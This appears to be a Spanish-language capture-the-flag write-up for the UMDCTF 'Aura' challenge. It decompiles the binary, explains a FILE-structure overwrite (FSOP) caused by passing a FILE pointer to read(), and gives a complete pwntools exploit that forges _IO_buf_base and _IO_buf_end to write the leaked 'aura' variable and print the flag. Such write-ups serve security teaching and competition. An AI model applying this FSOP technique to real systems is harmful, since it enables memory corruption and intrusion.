# Aura

## Analisis

Reconstruccion del codigo fuente a partir del decompilado:
``` C
undefined8 main(void)

{
  FILE *pFVar1;
  long in_FS_OFFSET;
  undefined local_138 [32];
  undefined local_118 [264];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setbuf(stdin,(char *)0x0);
  setbuf(stdout,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  printf("my aura: %p\nur aura? ",&aura);
  pFVar1 = fopen("/dev/null","r");
  read(0,pFVar1,0x100);
  fread(local_118,1,8,pFVar1);
  if (aura == 0) {
    puts("u have no aura.");
  }
  else {
    pFVar1 = fopen("flag.txt","r");
    fread(local_138,1,0x11,pFVar1);
    printf("%s\n ",local_138);
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

Este binario abre el dispositivo `/dev/null` y escribe en el hasta 0x100 bytes con `read` (esto al final se almacena en el heap)

Luego fread intenta leer 0x11 bytes desde `pfVar1` y lo almacena en el buffer `local_38`

El problema es que `fopen` devuelve un puntero a estructura `*FILE` y read espera un descriptor de archivo (un entero, no un puntero)

## FSOP

Como el `read` escribe directamente arriba de la estructura FILE podemos sobreescribirla para cambiar el buffer de entrada a la direccion de memoria de aura (que nos filtran) y sobreescribir su valor

https://cboard.cprogramming.com/c-programming/172974-how-does-file-struct-work-stdio-h.html

``` C
struct _IO_FILE {
  int _flags;        /* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags
 
  /* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  char* _IO_read_ptr;    /* Current read pointer */
  char* _IO_read_end;    /* End of get area. */
  char* _IO_read_base;    /* Start of putback+get area. */
  char* _IO_write_base;    /* Start of put area. */
  char* _IO_write_ptr;    /* Current put pointer. */
  char* _IO_write_end;    /* End of put area. */
  char* _IO_buf_base;    /* Start of reserve area. */
  char* _IO_buf_end;    /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */
 
  struct _IO_marker *_markers;
 
  struct _IO_FILE *_chain;
 
  int _fileno;
#if 0
  int _blksize;
#else
  int _flags2;
#endif
  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */
 
#define __HAVE_COLUMN /* temporary */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];
 
  /*  char* _save_gptr;  char* _save_egptr; */
 
  _IO_lock_t *_lock;
};
```

Lo mas importante aqui son los campos `_flags`, `_IO_buf_base`, `_IO_buf_end` y  `int _fileno`

Un valor de 0x8000 parar `_flags` es IO_USER_BUFF, buffer controlado por el usuario

`_IO_buf_base` es la direccion sobre la que se va a escribir, en este caso queremos la direccion base de aura

`_IO_buf_end` es el final de la direccion sobre la que se va a escribir, como se van a escribir 0x11 bytes, es *aura+0x10

`int _fileno` con valor 0 indica que se leera de la salida estandar

Asignamos estos valores y los campos intermedios los rellenamos con ceros

Exploit:
``` python
from pwn import *
# p = process("./aura")
p = remote("challs.umdctf.io",31006)

# Get aura address
p.recvuntil("my aura: ")
aura_addr = p.recvline()[:-1].decode()
aura_addr = aura_addr[2:]
aura_addr = bytes.fromhex(aura_addr)
aura_addr = int(aura_addr.hex(), 16)

print(f" aura at {hex(aura_addr)}")

p.recvuntil(b'ur aura? ')


# Complete FILE structure
payload  = p64(0x8000)                 # _flags                # _IO_USER_BUF flag
payload += p64(0)                      # _IO_read_ptr          # set all reads to null to force fread to read from stdin
payload += p64(0)                      # _IO_read_end
payload += p64(0)                      # _IO_read_base
payload += p64(0)                      # _IO_write base        # set writes to null because we are not using them
payload += p64(0)                      # _IO_write_ptr
payload += p64(0)                      # _IO_write_end
payload += p64(aura_addr)              # _IO_buf_base      # start of address to write to
payload += p64(aura_addr + 0x10)       # _IO_base_end      # end of address to write to
payload += p64(0) * 8                  # int _fileno somewhere here, set to 0 to force fread to read from stdin
payload += p64(0)                      #_IO_lock (after int _fileno)

p.sendline(payload)

# our stdin (fread uses this to write into aura)
p.sendline(b'A' * 0x10)                 # if you send as little as 16 you can read the flag

p.interactive()
```

`UMDCTF{+100aur4}`
